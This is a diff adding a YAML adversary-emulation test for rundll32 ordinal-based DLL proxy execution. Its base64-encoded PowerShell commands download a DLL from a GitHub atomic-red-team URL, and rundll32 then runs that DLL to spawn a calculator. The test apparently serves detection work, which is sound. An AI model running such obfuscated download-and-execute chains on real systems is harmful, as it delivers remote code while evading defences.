@@ -1,0 +1,18 @@
+- id: ba347d72-8c9e-5be2-8489-4a4e4c3e2a59
+  name: Soumaia ART Tests - Rundll32 with Ordinal Value
+  description: "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn."
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAbABsAFQAaABlAFQAaABpAG4AZwBzAHgANgA0AC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMQAwAC8AYgBpAG4ALwBBAGwAbABUAGgAZQBUAGgAaQBuAGcAcwB4ADYANAAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABBAGwAbABUAGgAZQBUAGgAaQBuAGcAcwB4ADYANAAuAGQAbABsACIACgA=
+          )
+          rundll32.exe ".\AllTheThingsx64.dll",#2
+        payloads:
+        - AllTheThingsx64.dll
